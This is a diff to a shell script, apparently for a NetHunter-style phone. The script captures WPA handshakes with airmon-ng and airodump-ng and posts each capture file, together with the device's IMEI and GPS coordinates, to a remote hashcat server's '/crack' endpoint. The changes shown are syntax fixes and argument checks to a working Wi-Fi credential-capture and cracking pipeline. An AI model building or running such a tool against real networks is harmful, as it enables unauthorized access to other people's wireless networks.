@@ -15,13 +15,13 @@ checkUtils() {
 }
 
 sendHandshake() {
- # echo $1
- # echo $2
-  long=`chroot /proc/1/cwd/ dumpsys location|grep "LongitudeDegrees: " | awk -F' |,'  '{print $13}'`
+  # echo $1
+  # echo $2
+  long=$(chroot /proc/1/cwd/ dumpsys location | grep "LongitudeDegrees: " | awk -F' |,' '{print $13}')
   echo "Long: "$long
-  lat=`chroot /proc/1/cwd/ dumpsys location|grep "LatitudeDegrees: " | awk -F' |,'  '{print $13}'`
+  lat=$(chroot /proc/1/cwd/ dumpsys location | grep "LatitudeDegrees: " | awk -F' |,' '{print $13}')
   echo "Lat: "$lat
-  imei=`chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]'`
+  imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
   echo "IMEI: "$imei
   curl -i -X POST -H "imei: $imei" -H "lon: $long" -H "lat: $lat" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/crack
   if [[ $? == 0 ]]; then
@@ -98,7 +98,7 @@ active() {
 
 passive() {
   trap 'checkHandshakes;rm /home/kali/shakes-*' EXIT
-  airmon-ng start wlan1 > /dev/null
+  airmon-ng start wlan1 >/dev/null
   echo "Start airodump.."
   timeout 60 airodump-ng -w /home/kali/shakes wlan1 </dev/null >/dev/null
   checkHandshakes $1
@@ -106,17 +106,19 @@ passive() {
   passive $1
 }
 
+if [[ $2 == "" ]]; then
+  echo "Please enter hashcat server address second argument"
+  exit 1
+fi
 
-if [[ $1 == "p" ]]
-then
+if [[ $1 == "p" ]]; then
   echo "Selected passive mode"
   echo $2
   passive $2
+elif [[ $1 == "a" ]]; then
+  echo "Selected active mode"
+  active $2
+else
+  echo "Use a - active or p - passive as first argument"
+  exit 1
 fi
-if [[ $1 == "a"]]
-  then
-    echo "Selected active mode"
-    active $2
-fi
-
-
